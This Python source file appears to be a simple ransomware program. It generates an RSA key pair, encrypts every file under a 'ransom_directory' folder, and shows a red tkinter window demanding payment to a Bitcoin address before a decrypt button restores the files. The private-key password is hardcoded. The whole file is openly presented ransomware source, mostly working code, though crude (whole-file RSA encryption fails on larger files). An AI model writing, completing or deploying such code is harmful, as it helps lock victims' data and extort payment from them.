from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import rsa
import os, sys, colorama
import tkinter as tk

dir = os.path.dirname(os.path.realpath(__file__)) # get current directory

def gen_key():
    try:
        privkey = open(f"{dir}/private.key","rb").read() # check if private key exists
        pubkey = open(f"{dir}/public.key","rb").read() # check if public key exists 

        return privkey, pubkey
    except:
        print(colorama.Fore.RED + "[!] - No key found. Generating new key pair...")
        pass
    
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048) # generate private key
    
    with open(f"{dir}/private.key","wb") as f: # write private key to file
        k = priv.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword') # password used to encrypt private key (see ransomware/decrypt.py)
        )
        privkey = k
        f.write(k)

    with open(f"{dir}/public.key","wb") as f: # write public key to file
        k = priv.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.PKCS1,
        )
        pubkey = k
        f.write(k)
        
    return privkey, pubkey

dir = os.path.dirname(os.path.realpath(__file__)) # get current directory

def encrypt(filename, public_key):
    public_key = serialization.load_pem_public_key( 
        public_key
    )
    with open(f"{dir}/{filename}", "rb") as f: # read file to encrypt
        encrypted = public_key.encrypt(
            f.read(), 
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            ) 
        ) # encrypt file (OAEP padding scheme with SHA256 hash algorithm and no label)

    with open(f"{dir}/{filename}", "wb") as f: # write encrypted file to disk
        f.write(encrypted)
        
def decrypt(filename, private_key):
    with open(f"{dir}/{filename}", "rb") as f: # read file to decrypt
        private_key = serialization.load_pem_private_key(
            private_key,
            password=b'mypassword', # password used to encrypt private key (see ransomware/decrypt.py)
        )
        decrypted = private_key.decrypt(
            f.read(), 
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            ) 
        ) # decrypt file (OAEP padding scheme with SHA256 hash algorithm and no label)

    with open(f"{dir}/{filename}", "wb") as f: # write decrypted file to disk
        f.write(decrypted)
        
def get_tree_file():
    
    files = []
    
    for path, _, file_names in os.walk(f"ransom_directory"):
        for file_name in file_names:
            file_path = os.path.join(path, file_name)
            files.append(file_path)
            
    return files

def encrypt_all():
    
    privkey, pubkey = gen_key() # generate key pair
    
    for file in get_tree_file(): # encrypt all files in ransom_directory
        try:
            encrypt(file, pubkey)
        except Exception as e:
            print(colorama.Fore.RED + "[!] - Error: {}".format(e))
        
def decrypt_all():
    
    privkey, pubkey = gen_key() # generate key pair
    
    for file in get_tree_file(): # decrypt all files in ransom_directory
        try:
            decrypt(file, privkey)
        except Exception as e:
            print(colorama.Fore.RED + "[!] - Error: {}".format(e))
    thank_you()

def your_files_are_encrypted():
    root = tk.Tk()
    root.title("Your files are encrypted")
    root.geometry("700x500")
    root.configure(background='red')
    
    label = tk.Label(root, text="Your files are encrypted", font=("Arial", 15))
    btc_addrs = tk.Label(root, text="Pay 1$ for decryption : 1F1tAaz5x1HMaxCNLbtCMamxw6x4pdNn4xqX", font=("Arial", 15))
    
    btn_decrypt = tk.Button(root, text="Decrypt your files", command=decrypt_all)
    
    label.pack(pady=10)
    btc_addrs.pack(pady=10)
    
    btn_decrypt.pack(pady=10)
    
    root.mainloop()

def thank_you():
    try:
        root = tk.Tk()
        root.title("Thank you")
        root.geometry("700x500")
        root.configure(background='green')
        
        label = tk.Label(root, text="Thank you for paying", font=("Arial", 15))
        label.pack(pady=10)
        
        root.mainloop()
        
    except Exception as e:
        print(colorama.Fore.RED + "[!] - Error: {}".format(e))

if __name__ == "__main__":

    try:
        if sys.argv[1] == "encrypt":
            encrypt_all()
            your_files_are_encrypted()
            print("Files encrypted")
        elif sys.argv[1] == "decrypt":
            decrypt_all()
            print("Files decrypted")
        else:
            print("Usage: python3 main.py [encrypt|decrypt]")
    except Exception as e:
        print(colorama.Fore.RED + "[!] - Error: {}".format(e))